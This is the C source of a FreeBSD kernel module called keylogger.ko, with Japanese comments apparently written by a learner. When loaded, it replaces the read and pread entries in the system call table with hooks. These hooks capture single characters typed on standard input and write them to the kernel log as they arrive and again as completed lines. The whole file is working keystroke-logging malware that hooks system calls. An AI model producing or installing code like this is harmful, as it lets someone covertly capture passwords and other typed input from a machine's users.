#include <sys/param.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

/*
	ユーザによる出力は以下の４システムコールにより処理される。
	read, pread, readv(*), preadv(*)
	*: readv, preadvのマニュアルページを読んでも、使い方わからず未実装のままにしました。

	今回は標準入力にしか興味ないのですが、以下の流れのように処理しています。
	- 出力可能文字・タブ文字が入力されたとき、bufferに保存する。その際、cursorを増加する。
	- 復帰か改行の場合、bufferの中身をカーネル・ログに書き込み、リセットする。
	- bufferのサイズが固定なので、いっぱいになったときカーネル・ログに出力しリセットする。
*/

#define BUFFERSIZE 255
MALLOC_DECLARE(M_KEYLOGGER_BUF);
MALLOC_DEFINE(M_KEYLOGGER_BUF, "Keylogger Buffer", "Keylogger Buffer");

static char *buffer_start;
static char *buffer_current;

static void
handle_character(char c)
{
	if ((buffer_current - buffer_start) >= BUFFERSIZE ||
		(buffer_current != buffer_start && (c == '\r' || c == '\n'))) {
		*buffer_current = 0;
		printf("[keylogger.ko] %s\n", buffer_start);
		buffer_current = buffer_start;
		*buffer_current = 0;
	} else if ((0x20 <= c && c < 0x7f) || c == '\t') {
		*(buffer_current++) = c;
		printf("%c %hhu\t%p (+%ld)\n", c, c, buffer_current,
			(buffer_current - buffer_start));
	}
}

static int
read_hook(struct thread *td, struct read_args *args)
{
	struct read_args *uap = (struct read_args *) args;
	int result = sys_read(td, args);

	// カーネル空間からユーザ界のデータを直接アクセスしちゃだめらしい、、、
	if (uap->fd == 0 && uap->nbyte == 1) {
		// 標準入力のみ盗聴
		char buffer[uap->nbyte];
		copyinstr(uap->buf, buffer, uap->nbyte, NULL);
		handle_character(buffer[0]);
	}

	return result;
}

static int
pread_hook(struct thread *td, struct pread_args *args)
{
	// (int fd, void *buf, size_t nbytes, off_t offset); // これどこ見つけた？
	struct pread_args *uap = (struct pread_args *) args;
	int result = sys_pread(td, args);

	// カーネル空間からユーザ界のデータを直接アクセスしちゃだめらしい、、、
	if (uap->fd == 0 && uap->nbyte == 1) {
		// 標準入力のみ盗聴
		char buffer[uap->nbyte];
		copyinstr(uap->buf, buffer, uap->nbyte, NULL);
		handle_character(buffer[0]);
	}

	return result;
}

static int
load(struct module *module, int cmd, void *arg)
{
	switch(cmd) {
		case MOD_LOAD:
			buffer_start = malloc(BUFFERSIZE + 1,
				M_KEYLOGGER_BUF, M_ZERO | M_WAITOK);
			buffer_current = buffer_start;
			sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
			sysent[SYS_pread].sy_call = (sy_call_t *) pread_hook;
			printf("[keylogger.ko] Loaded Module; Addr of buffer: %p\n", buffer_start);
			break;
		case MOD_UNLOAD:
			free(buffer_start, M_KEYLOGGER_BUF);
			sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
			sysent[SYS_pread].sy_call = (sy_call_t *) sys_pread;
			printf("[keylogger.ko] Unloaded Module\n");
			break;
		default:
			return EOPNOTSUPP;
	}

	return 0;
}

static moduledata_t mod_keylogger = {
	"keylogger",
	load,
	NULL
};

DECLARE_MODULE(keylogger, mod_keylogger, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
